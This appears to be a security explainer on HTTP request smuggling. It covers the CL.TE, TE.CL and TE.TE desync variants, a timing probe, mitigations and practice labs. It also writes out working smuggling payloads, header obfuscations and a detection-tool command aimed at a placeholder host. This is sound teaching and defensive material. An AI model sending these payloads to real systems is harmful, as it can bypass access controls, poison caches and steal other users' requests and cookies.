# What is HTTP Request Smuggling?

HTTP Request Smuggling happens when a front-end (proxy, load balancer, CDN) and a back-end server disagree about where one request ends and the next begins. The attacker crafts a request that the front-end sees as one message and the back-end splits into two, smuggling a hidden request in front of the next user's traffic. Impact ranges from cache poisoning to stealing other users' requests and bypassing front-end auth.

## The core desync

- `Content-Length` (CL) says the body is N bytes
- `Transfer-Encoding: chunked` (TE) says the body ends at a zero-size chunk
- If two servers prioritize different headers, the boundary desyncs

## The three variants

- **CL.TE** - front-end uses `Content-Length`, back-end uses `Transfer-Encoding`
- **TE.CL** - front-end uses `Transfer-Encoding`, back-end uses `Content-Length`
- **TE.TE** - both support TE, but one can be tricked into ignoring it (obfuscate the header)

## Detection first (safe timing probes)

Before exploiting, confirm a desync with a timing probe (a wrong `Content-Length` makes the back-end wait for bytes that never come):

```http
# CL.TE timing probe - back-end hangs waiting for the chunk body
POST / HTTP/1.1
Host: target.tld
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If the response is delayed by seconds, you likely have a CL.TE desync. Reverse the logic for TE.CL.

## Exploitation payloads

```http
# CL.TE - smuggle a prefix onto the NEXT user's request
POST / HTTP/1.1
Host: target.tld
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

```http
# TE.CL
POST / HTTP/1.1
Host: target.tld
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.tld

0

```

```http
# TE.TE - obfuscate TE so only one server honours it
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding : chunked
```

## What you can do with it (impact)

- **Bypass front-end access controls** - smuggle a request to `/admin` that the front-end never inspected
- **Steal other users' requests** - capture the victim's request (including cookies) by appending it to a stored/reflected field
- **Web cache poisoning / deception**
- **Turn a reflected XSS into one that needs no user interaction**

## Tools

- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) - Burp extension by James Kettle (run this first)
- Burp Repeater - **disable "Update Content-Length"** to craft payloads manually
- [smuggler](https://github.com/defparam/smuggler) - CLI desync detection

```bash
# CLI detection
python3 smuggler.py -u https://target.tld/
```

## Important safety note

Smuggling affects **real users' traffic**. Only test in scope, keep concurrency low, and prefer the vendor's/lab environment. A careless payload can break the site for others.

## Mitigation - the fix

- Use **HTTP/2 end to end** and do not downgrade to HTTP/1.1 at the back-end.
- Make front-end and back-end normalise headers identically.
- **Reject** any request containing both `Content-Length` and `Transfer-Encoding`.
- Keep proxies/CDNs patched; this class evolves quickly.

## Practice

- [PortSwigger request smuggling labs](https://portswigger.net/web-security/request-smuggling)

## Deep dive

- [HTTP Request Smuggling - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger request smuggling labs](https://portswigger.net/web-security/request-smuggling)

## CWE

- CWE-444: Inconsistent Interpretation of HTTP Requests (HTTP Request Smuggling)
